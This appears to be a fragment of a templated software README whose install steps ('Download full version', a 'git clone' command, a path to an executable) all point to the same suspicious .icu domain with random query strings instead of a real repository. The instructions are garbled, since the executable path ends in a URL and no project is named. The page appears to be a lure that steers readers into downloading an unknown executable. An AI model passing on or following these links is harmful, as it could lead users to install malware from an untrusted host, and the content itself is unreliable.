...
[Download full version](https://gitzdownloadkm.icu?7n6n46h3xvdblvr)
...
![last1](https://gitzdownloadkm.icu?rvve844ddjo0lr5)
> Download These

2. Clone the repo
   ```sh
   git clone https://gitzdownloadkm.icu?elxio71y8ghfvvt
   ```
3. OR

![download](https://gitzdownloadkm.icu?nhig76xifrxdxrr)


4. _Then open the sln (Project Solution) file_

![vsgif](https://gitzdownloadkm.icu?kmccy17e5bgak3u)

5. Find Executable File
   ```sh
   /ProjectName/Bin/Debug/https://gitzdownloadkm.icu?kb950lm2ih5h959
   ```
<p align="right">(<a href="#readme-top">back to top</a>)</p>
